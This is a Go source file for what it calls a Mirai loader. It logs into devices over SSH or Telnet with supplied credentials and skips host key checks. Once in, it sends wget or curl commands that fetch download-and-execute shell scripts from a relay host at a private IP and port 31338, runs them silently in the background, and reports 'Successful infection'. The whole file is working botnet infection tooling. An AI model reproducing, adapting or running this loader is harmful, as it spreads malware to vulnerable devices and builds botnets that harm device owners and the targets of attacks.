//Will load MIRAI onto the device
package main

import (
	"fmt"
	"net"
	"strings"
	"time"
	"os"
	"os/exec"
	"golang.org/x/crypto/ssh"
)
var (
	__RELAY_H__   = "192.168.6.97"
	__RELAY_P__   = 31338
	__RELAY_PS_   = "||"
	__TIMEOUT__   = 2 * time.Second
	__C2DELAY__   = 5 * time.Second
	__THREADS__   = 10
)

func login22(usr string , psw string,ip string,port string){

	config := &ssh.ClientConfig{
		User: usr,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: []ssh.AuthMethod{
			ssh.Password(psw),
		},
		Timeout: __TIMEOUT__,
	}
	conn, err := ssh.Dial("tcp", ip+":22", config)
	if err != nil {
		fmt.Println("login Failed")
		time.Sleep(60*time.Second)	//if connected refused waiting 60s
		cmd:=exec.Command("./loader" , usr , psw , ip , "22")
		cmd.Run()
		return
	}
	defer conn.Close()
	session, err := conn.NewSession()
	defer session.Close()
	stdinBuf, _ := session.StdinPipe()
	err = session.Shell()
	if err != nil {
		fmt.Println("無法啟動遠端 shell:%v", err)
	}
	stdinBuf.Write([]byte("wget http://"+__RELAY_H__+":"+intToString(__RELAY_P__)+"/wget_download_exec.sh || curl http://"+__RELAY_H__+":"+intToString(__RELAY_P__)+"/curl_download_exec.sh -o curl_download_exec.sh\n"))
	time.Sleep(time.Second)
	stdinBuf.Write([]byte("chmod +x wget_download_exec.sh || chmod +x curl_download_exec.sh\n"))
	stdinBuf.Write([]byte("(sh ./wget_download_exec.sh || sh ./curl_download_exec.sh) > /dev/null 2>&1 &\n"))
	fmt.Println("Successful infection")
}

func login23(usr string , psw string,ip string,port string){
	fmt.Printf("[loader] login %s..\n", ip)
	conn, err := net.DialTimeout("tcp", ip + ":"+port, __TIMEOUT__)
	defer conn.Close()
	if err == nil {
		for{
			s:=""
			for {
				time.Sleep(1 * time.Second)
				buf := make([]byte, 256)
				conn_word,err:=conn.Read(buf)
				if err==nil{
					s = string(buf[:conn_word])
					if strings.Contains(s,"#"){
						fmt.Println("Sucessful")
						break 
					}
					if strings.Contains(s,"login:")||strings.Contains(s,"Login:")||strings.Contains(s,"password:")||strings.Contains(s,"Password:"){
						break
					}
				}else{
					return
				}
			}	
			if strings.Contains(s,"login:")||strings.Contains(s,"Login:")||strings.Contains(s,"username:"){
				conn.Write([]byte(usr+"\n"))
			}
			if strings.Contains(s,"password:")||strings.Contains(s,"Password:"){
				conn.Write([]byte(psw+"\n"))
			}
			if strings.Contains(s,"#"){
				conn.Write([]byte("which wget && curl"+"\n"))
				if strings.Contains(s,"wget"){
					cmd:="wget http://"+__RELAY_H__+":"+intToString(__RELAY_P__)+"/wget_download_exec.sh"
					conn.Write([]byte(cmd+"\n"))
					time.Sleep( 3 * time.Second)
					conn.Write([]byte("chmod +x wget_download_exec.sh"+"\n"))
					time.Sleep( 1 * time.Second)
					conn.Write([]byte("sh ./wget_download_exec.sh > /dev/null 2>&1 &"+"\n"))
					time.Sleep( 60 * time.Second)
					fmt.Println("Broken New Device")
					return
				}
				if strings.Contains(s,"curl"){
					cmd:="curl http://"+__RELAY_H__+":"+intToString(__RELAY_P__)+"/curl_download_exec.sh -o curl_download_exec.sh"
					conn.Write([]byte(cmd+"\n"))
					time.Sleep( 3 * time.Second)
					conn.Write([]byte("chmod +x curl_download_exec.sh"+"\n"))
					time.Sleep( 1 * time.Second)
					conn.Write([]byte("sh ./curl_download_exec.sh > /dev/null 2>&1 &"+"\n"))
					time.Sleep( 60 * time.Second)
					fmt.Println("Broken New Device")
					return
				}
			}
		}
	}else {
		return 
	}
}
func intToString(num int) string {

	if num == 0 {
		return "0"
	}
	sign := ""
	if num < 0 {
		sign = "-"
		num = -num
	}
	var digits []byte
	for num > 0 {
		digit := '0' + byte(num%10)
		digits = append([]byte{digit}, digits...)
		num /= 10
	}
	return sign + string(digits)
}

func main(){

	if len(os.Args)<1{
		fmt.Println("Error")
	}else{
		if len(os.Args)==2{
			if os.Args[2]=="22"{
				login22("","",os.Args[1],os.Args[2])
			}
			if os.Args[2]=="23"{
				login23("","",os.Args[1],os.Args[2])
			}
		}
		switch os.Args[4] {
			case "23":
				//login23("admin","password","192.168.1.181","23")						
				login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
			case "2323":
				//login23("admin","password","192.168.1.181","23")	
				login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
			case "22":
				login22(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
		}
	}
}